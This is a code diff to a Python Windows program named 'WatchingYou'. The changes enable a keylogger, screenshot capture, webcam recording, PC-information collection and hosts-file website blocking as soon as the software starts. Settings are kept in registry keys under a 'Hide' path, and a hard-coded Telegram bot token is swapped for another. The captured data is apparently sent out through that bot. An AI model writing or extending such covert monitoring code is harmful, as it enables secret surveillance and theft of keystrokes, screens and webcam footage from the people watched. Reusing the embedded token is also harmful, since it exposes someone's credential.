@@ -459,22 +459,29 @@ class WebsiteBlock:
         self.listWebs =  str(WinRegistry(self.registry ).read_value('list_webs'))
 
     def __read_file(self, path):
-        content = ""
-        file = open(path, "r")
-        for l in file.readlines():
-            content += l
-        file.close()
-        return content
+        try:
+            content = ""
+            file = open(path, "r")
+            for l in file.readlines():
+                content += l
+            file.close()
+            return content
+        except:
+            print('Hubo un error al leer: '+ path)
+            pass
 
     def __write_file(self, text, split=True, type="a"):
-        file = open(self.hostsPath, type)
         try:
-            for t in text.split("\n"):
-                file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
+            file = open(self.hostsPath, type)
+            try:
+                for t in text.split("\n"):
+                    file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
+            except:
+                print("Falló el split")
+                # file.write(text)
+            file.close()
         except:
-            print("Falló el split")
-            # file.write(text)
-        file.close()
+            print('No tienes los permisos necesario o no se pudo abrir el archivo')
 
     def __rewrite_file(self, text):
         self.__write_file(text, False, "w")
@@ -584,6 +591,8 @@ class PCInformation:
                 while (True):
                     init()
                     time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))
+
+        init()
 
 
 class WebCam_IA:
@@ -715,7 +724,6 @@ class WatchingYou:
             reg.set_value_DWORD('limit', 15)
             print(
                 f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
-
         def write_screenshot_reg():
             reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot')
             reg.set_value_DWORD('active', 1)
@@ -726,7 +734,7 @@ class WatchingYou:
         def write_telegram_bot_reg():
             reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot')
             reg.set_value_MultiString('id', "")
-            reg.set_value_String('token', "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM")
+            reg.set_value_String('token', "1479089003:AAHyp-gXXezKm130WHwpMSFNOAZWJQME-Vk")
             print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
                   f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
         def write_info_reg():
@@ -801,7 +809,13 @@ class WatchingYou:
             reg.set_value_DWORD('active', 1)
             reg.set_value_String('extension', '.mp4')
             reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\webcam')
+        def webcam_pc_information_reg():
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\PCInformation')
+            reg.set_value_DWORD('active', 1)
+            reg.set_value_String('interval', '200')
+            reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\pc_information')
 
+        webcam_pc_information_reg()
         write_website_reg()
         write_keylogger_reg()
         write_screenshot_reg()
@@ -814,6 +828,7 @@ class WatchingYou:
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').set_value_DWORD('active',  value)
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebsiteBlock').set_value_DWORD('active',  value)
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebCam').set_value_DWORD('active', value)
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\PCInformation').set_value_DWORD('active', value)
 
     def active(self):
         self.__active_or_disable(1)
@@ -841,67 +856,58 @@ if __name__ == '__main__':
     for f in folders:
         Util().delete_folder(f)  # Remove foldes and files // Cache
         Util().create_folder(f)  # Create folders for cache
-    """
-    '''
-    time.sleep(1)
-    # Eliminar todas las carpetas
-    threading.Thread(target=Keylogger().listen_key).start()
-    threading.Thread(target=Screenshot().send).start()
 
-    # Verifica permisos de admistrador: Administrador
-    WebCam_IA().start()
-    '''
+
+
 
     eel.init('web')     # Nombre de la carpeta
 
     @eel.expose
     def start_software():
-
+        print('El software está empezando')
         print("Is Admin?: Admin Success" if Util().is_admin() else "Is Admin?: Admin Failed")
 
-
-        print("Está en linea")
-        return True
-
-    @eel.expose
-    def stop___(): # Detiene todo el proceso
-
-        print('se detuvo')
-        # Modificar registro
-        return ""
-
-    @eel.expose
-    def start___():  # Inicia todo el proceso
-        print('continuar')
-
-        '''
-        #threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
-        threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
-        print("PATH Screenshot: " )
+        if Util().is_admin():
+            threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
+            #threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
         threading.Thread(target=PCInformation().send).start()
         threading.Thread(target=Keylogger().listen_key).start()
-
+        threading.Thread(target=Screenshot().send).start()
         WebCam_IA().start()
-        '''
+        WatchingYou().active()
 
 
         # Crea Registros
         # Modificar Registro
 
+        return True
+
+    @eel.expose
+    def stop___(): # Detiene todo el proceso
+
+        # vuelve al inicio del software, tambien detener
+        WatchingYou().disabled()
+        # Modificar registro
+        return ""
+
+    @eel.expose
+    def start___():  # Inicia todo el proceso
+        # se detiene el software confirmado
+        WatchingYou().disabled()
         return ""
 
     @eel.expose
     def exit___(self):  # Inicia todo el proceso
         #eel._shutdown
-        # Detiene servicio
+        print('detener??')
         # Cierra software
-
         os._exit(1)
         return ""
 
     @eel.expose
     def retorno(d):  # Inicia todo el proceso
-        print('funcion retorno actvado ')
+        WatchingYou().active()
+        print('se volvieron activar loss ervicios')
         return "true"
 
     @eel.expose
@@ -910,9 +916,4 @@ if __name__ == '__main__':
         print(chat_id)
         return WatchingYou().check_id(fullname, [chat_id])
 
-
-
     eel.start('index.html',  size=(950, 600))
-    
-
-    """
